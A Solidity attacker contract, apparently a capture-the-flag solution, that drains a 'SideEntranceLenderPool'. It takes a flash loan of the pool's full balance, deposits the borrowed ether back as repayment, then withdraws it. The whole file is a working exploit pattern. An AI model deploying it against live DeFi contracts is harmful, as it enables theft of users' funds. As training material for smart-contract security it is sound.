import "./SideEntranceLenderPool.sol";
import "hardhat/console.sol";
contract AttackerSideEntrance {
    SideEntranceLenderPool immutable sideEntranceLenderPool;


    constructor(address _sideEntranceLenderPool){
        sideEntranceLenderPool = SideEntranceLenderPool(_sideEntranceLenderPool);
    }

    function attack () external{
        uint256 amount = address(sideEntranceLenderPool).balance;

        sideEntranceLenderPool.flashLoan(amount);
       
    }

    function execute () external payable {
        uint256 amount = address(sideEntranceLenderPool).balance;
        sideEntranceLenderPool.deposit{value: msg.value}();
    }

    function sendToAddr () external{
        sideEntranceLenderPool.withdraw();
        (bool success, bytes memory _data) = msg.sender.call{value: address(this).balance}("");
        require(success, "transaction failed");
    }
    
    receive () external payable{

          console.log("inside fallback now!");

    }
}